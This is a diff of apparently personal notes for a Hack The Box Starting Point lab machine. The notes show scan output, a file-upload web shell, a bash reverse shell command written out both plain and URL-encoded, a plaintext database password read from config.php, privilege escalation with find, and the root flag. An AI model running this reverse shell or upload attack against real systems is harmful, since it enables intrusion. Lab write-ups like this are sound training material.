@@ -23,7 +23,7 @@ PORT   STATE SERVICE VERSION
 |_http-title: Welcome to Base
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
----
+
 
 ### nmap -p- -T5 $IP
 PORT   STATE SERVICE
@@ -75,7 +75,7 @@ gobuster dir --url http://$IP/ --wordlist /usr/share/wordlists/dirb/big.txt
 /login                (Status: 301) [Size: 314] [--> http://10.129.95.184/login/]    
 /server-status        (Status: 403) [Size: 278]                                      
 2023/05/30 15:58:22 Finished
----
+
 
 ## To login
 
@@ -86,12 +86,11 @@ uplad file that has
  then go to /_uploaded and open the file in the broser and you should get a ?cmd=
  in the url I had to type it in but it worked once i did 
  then using burp intercept, change the request type to POST from GET then send to reptert and url encode /bin/bash -c 'bash -i >& /dev/tcp/&MyIP/PORT 0>&1'
- %2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%35%2e%37%39%2f%35%35%35%35%20%30%3e%26%31%27
---- 
-
+ `%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%35%2e%37%39%2f%35%35%35%35%20%30%3e%26%31%27`
  then set up your lisaner on the PORT 
  then you will get a rshell
  
+
  www-data@base:/var/www/html/_uploaded$ cat /var/www/html/login/config.php
 cat /var/www/html/login/config.php
 <?php
@@ -101,7 +100,7 @@ $password = "thisisagoodpassword";
 ls /home
 john
 
-cant su 
+cant su john
 so ssh john
 
 
@@ -125,7 +124,7 @@ root
 
 found at [GTFOBins](https://gtfobins.github.io/gtfobins/find/)
 
-# cat /root/root.txt
+\# cat /root/root.txt
 51709519ea18ab37dd6fc58096bea949
 
 this is part of HTB startingpoint tire 2 
